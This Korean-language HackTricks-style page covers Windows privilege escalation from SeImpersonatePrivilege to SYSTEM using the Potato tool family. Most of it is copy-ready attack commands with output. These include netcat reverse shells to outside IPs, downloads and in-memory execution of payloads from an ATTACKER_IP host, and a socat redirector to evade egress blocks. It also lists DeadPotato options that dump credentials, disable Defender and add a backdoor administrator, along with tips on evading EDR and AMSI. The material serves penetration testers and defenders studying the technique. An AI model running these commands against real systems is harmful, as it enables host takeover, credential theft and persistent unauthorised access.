# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato는 Windows Server 2019 및 Windows 10 빌드 1809 이후 버전에서 작동하지 않습니다.** 하지만 [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)**를 사용해 **동일한 권한을 활용하고 `NT AUTHORITY\SYSTEM`** 수준의 액세스 권한을 얻을 수 있습니다. 이 [블로그 게시물](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)에서는 JuicyPotato가 더 이상 작동하지 않는 Windows 10 및 Server 2019 호스트에서 가장 권한을 악용하는 데 사용할 수 있는 `PrintSpoofer` 도구를 자세히 설명합니다.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> 2024–2025년에 자주 유지 관리되는 최신 대안은 SigmaPotato(GodPotato의 포크)로, 메모리 내/.NET reflection 사용과 확장된 OS 지원을 추가합니다. 아래의 간단한 사용법과 References의 저장소를 참고하세요.

배경 및 수동 기법에 관한 관련 페이지:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## 요구 사항 및 일반적인 주의 사항

다음 모든 기법은 아래 권한 중 하나를 보유한 컨텍스트에서 가장 기능이 있는 권한 서비스의 취약한 동작을 악용합니다.

- SeImpersonatePrivilege(가장 일반적) 또는 SeAssignPrimaryTokenPrivilege
- 토큰에 이미 SeImpersonatePrivilege가 있다면 High integrity는 필요하지 않습니다(IIS AppPool, MSSQL 등의 여러 서비스 계정에서 일반적).

권한을 빠르게 확인합니다:

```cmd
whoami /priv | findstr /i impersonate
```

운영 참고 사항:

- shell이 SeImpersonatePrivilege가 없는 제한된 token으로 실행되는 경우(일부 환경의 Local Service/Network Service에서 흔함), FullPowers로 계정의 기본 privileges를 복원한 다음 Potato를 실행하세요. 예: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- process token은 같은 service account 또는 logon session의 다른 token보다 privileges가 적을 수 있습니다. 일부 구성에서는 같은 session의 named-pipe client를 통해 SeImpersonatePrivilege가 있는 다른 token을 사용할 수 있지만, service의 구성된 `RequiredPrivileges`와 `whoami /priv`는 서로 다른 내용을 설명하며, 그런 token을 사용할 수 있다는 증거가 되지 않습니다. impersonation 경로를 고려하기 전에 실제 token을 확인하세요.
- PrintSpoofer를 사용하려면 Print Spooler service가 실행 중이고 로컬 RPC endpoint(spoolss)를 통해 연결 가능해야 합니다. PrintNightmare 이후 Spooler가 비활성화된 강화 환경에서는 RoguePotato/GodPotato/DCOMPotato/EfsPotato를 우선 사용하세요.
- RoguePotato를 사용하려면 TCP/135에서 OXID resolver에 연결할 수 있어야 합니다. egress가 차단된 경우 redirector/port-forwarder를 사용하세요(아래 예시 참조). 사용 중인 build에서 지원하는 flags를 확인하세요.
- EfsPotato/SharpEfsPotato는 MS-EFSR을 악용합니다. 한 pipe가 차단되면 다른 pipe(lsarpc, efsrpc, samr, lsass, netlogon)를 시도하세요.
- RpcBindingSetAuthInfo 중 발생하는 Error 0x6d3는 보통 알 수 없거나 지원되지 않는 RPC authentication service를 의미합니다. 다른 pipe/transport를 시도하거나 대상 service가 실행 중인지 확인하세요.
- DeadPotato와 같은 “Kitchen-sink” forks에는 디스크에 접근하는 추가 payload modules(Mimikatz/SharpHound/Defender off)이 포함되어 있습니다. slim originals보다 EDR 탐지 가능성이 높을 수 있습니다.

## 빠른 데모

### PrintSpoofer

```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```

참고:
- 현재 콘솔에서 대화형 프로세스를 실행하려면 -i를 사용하고, 한 줄 명령을 실행하려면 -c를 사용할 수 있습니다.
- Spooler 서비스가 필요합니다. 비활성화되어 있으면 실패합니다.

### RoguePotato

```bash
c:\RoguePotato.exe -r 10.10.10.10 -e "cmd.exe /c whoami" -l 9999
```

[upstream usage](https://github.com/antonioCoco/RoguePotato#usage)에서 `-e`는 명령을 지정하고, `-l`은 로컬 resolver 포트를 선택하며, 선택적 인수인 `-c`는 CLSID를 선택합니다. COM activation이 실행 파일 경로가 이미 변경된 서비스를 시작하는 경우, 해당 서비스는 token impersonation과 무관하게 변경된 명령을 실행할 수 있습니다. 관찰된 SYSTEM 실행이 이 기법 때문이라고 단정하기 전에 서비스 구성을 확인하세요.

아웃바운드 135가 차단된 경우, redirector에서 socat을 사용해 OXID resolver를 우회하세요:<sup>[[9]](#references)</sup>

```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```

### PrintNotifyPotato

PrintNotifyPotato는 2022년 말 공개된 새로운 COM abuse primitive로, Spooler/BITS 대신 **PrintNotify** 서비스를 대상으로 합니다. 바이너리는 PrintNotify COM server를 인스턴스화하고 가짜 `IUnknown`을 끼워 넣은 다음, `CreatePointerMoniker`를 통해 privileged callback을 트리거합니다. **SYSTEM**으로 실행되는 PrintNotify 서비스가 다시 연결되면, 프로세스는 반환된 token을 복제하고 전체 권한으로 지정된 payload를 실행합니다.<sup>[[13]](#references)</sup>

주요 운영 참고 사항:

* Print Workflow/PrintNotify 서비스가 설치되어 있다면 Windows 10/11 및 Windows Server 2012–2022에서 동작합니다(PrintNightmare 이후 레거시 Spooler가 비활성화된 경우에도 설치되어 있습니다).
* 호출 컨텍스트에 **SeImpersonatePrivilege**가 있어야 합니다(IIS APPPOOL, MSSQL, 예약된 작업의 서비스 계정에서 일반적으로 보유).
* 직접 명령 또는 대화형 모드를 사용할 수 있어 원래 콘솔에서 작업을 계속할 수 있습니다. 예:

  ```cmd
  PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
  PrintNotifyPotato.exe whoami
  ```

* 순수하게 COM 기반이므로 named-pipe listener나 외부 redirector가 필요하지 않아, Defender가 RoguePotato의 RPC binding을 차단하는 호스트에서 바로 대체해 사용할 수 있습니다.

Ink Dragon과 같은 공격 그룹은 SharePoint에서 ViewState RCE를 획득한 직후 PrintNotifyPotato를 실행해 `w3wp.exe` worker에서 SYSTEM으로 pivot한 다음 ShadowPad를 설치합니다.<sup>[[14]](#references)</sup>

### SharpEfsPotato

```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```

### EfsPotato

```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```

팁: 한 파이프가 실패하거나 EDR이 차단하면, 지원되는 다른 파이프를 시도하세요:

```text
EfsPotato <cmd> [pipe]
  pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```

### GodPotato

```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```

참고:
- SeImpersonatePrivilege가 있으면 Windows 8/8.1–11 및 Server 2012–2022에서 작동합니다.
- 설치된 runtime에 맞는 binary를 가져옵니다(예: 최신 Server 2022에서는 `GodPotato-NET4.exe`).
- 초기 실행 수단이 timeout이 짧은 webshell/UI라면 payload를 script로 준비한 다음, 긴 inline command 대신 GodPotato에 실행하도록 요청합니다.<sup>[[12]](#references)</sup>

쓰기 가능한 IIS webroot에서 빠르게 준비하는 패턴:

```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato는 기본값이 RPC_C_IMP_LEVEL_IMPERSONATE인 서비스 DCOM 객체를 대상으로 하는 두 가지 변형을 제공합니다. 제공된 바이너리를 빌드하거나 사용한 뒤 명령을 실행하세요:

```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```

### SigmaPotato (updated GodPotato fork)

SigmaPotato는 .NET reflection을 통한 메모리 내 실행과 PowerShell reverse shell 도우미 같은 최신 편의 기능을 추가합니다.<sup>[[8]](#references)</sup>

```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```

2024–2025 빌드(v1.2.x)의 추가 기능:
- 내장 reverse shell 플래그 `--revshell`과 1024자 PowerShell 제한 제거로, 긴 AMSI 우회 payload를 한 번에 실행할 수 있습니다.
- Reflection에 적합한 구문(`[SigmaPotato]::Main()`)과 간단한 휴리스틱을 혼란시키는 `VirtualAllocExNuma()` 기반의 기초적인 AV 우회 기법을 제공합니다.
- PowerShell Core 환경을 위해 .NET 2.0을 대상으로 컴파일한 별도의 `SigmaPotatoCore.exe`를 제공합니다.

### DeadPotato (모듈을 추가한 2024년 GodPotato 재작업 버전)

DeadPotato는 GodPotato의 OXID/DCOM impersonation 체인을 유지하면서 post-exploitation 도우미 기능을 포함합니다. 따라서 별도의 도구 없이 즉시 SYSTEM 권한을 획득하고 지속성 확보 및 정보 수집을 수행할 수 있습니다.<sup>[[15]](#references)</sup>

일반 모듈(모두 SeImpersonatePrivilege 필요):

- `-cmd "<cmd>"` — 임의의 명령을 SYSTEM 권한으로 실행합니다.
- `-rev <ip:port>` — 간편한 reverse shell.
- `-newadmin user:pass` — 지속성 확보를 위해 로컬 관리자 계정을 생성합니다.
- `-mimi sam|lsa|all` — Mimikatz를 내려받아 실행하고 자격 증명을 덤프합니다(디스크에 흔적을 남기며 눈에 띕니다).
- `-sharphound` — SYSTEM 권한으로 SharpHound 수집을 실행합니다.
- `-defender off` — Defender 실시간 보호를 비활성화합니다(매우 눈에 띕니다).

한 줄 실행 예시:

```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```

추가 바이너리가 포함되어 있어 AV/EDR 탐지 경고가 더 많이 발생할 수 있습니다. 은밀성이 중요하다면 더 가벼운 GodPotato/SigmaPotato를 사용하세요.

## References

- [1] [PrintSpoofer – Windows 10 및 Server 2019에서 가장 권한 악용하기](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [JuicyPotato는 이제 끝인가? 옛날이야기, RoguePotato를 환영합니다](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – 서비스 계정의 기본 토큰 권한 복원](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — WMP NTLM leak → NTFS junction으로 웹 루트에 연결해 RCE → FullPowers + GodPotato로 SYSTEM 권한 획득](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — LibreOffice 매크로 → IIS 웹셸 → GodPotato로 SYSTEM 권한 획득](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Ink Dragon 내부: 은밀한 공격 작전의 릴레이 네트워크와 내부 작동 방식 공개](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – post-ex 모듈이 내장된 GodPotato 개조 버전](https://github.com/lypd0/DeadPotato)
{{#include ../../banners/hacktricks-training.md}}
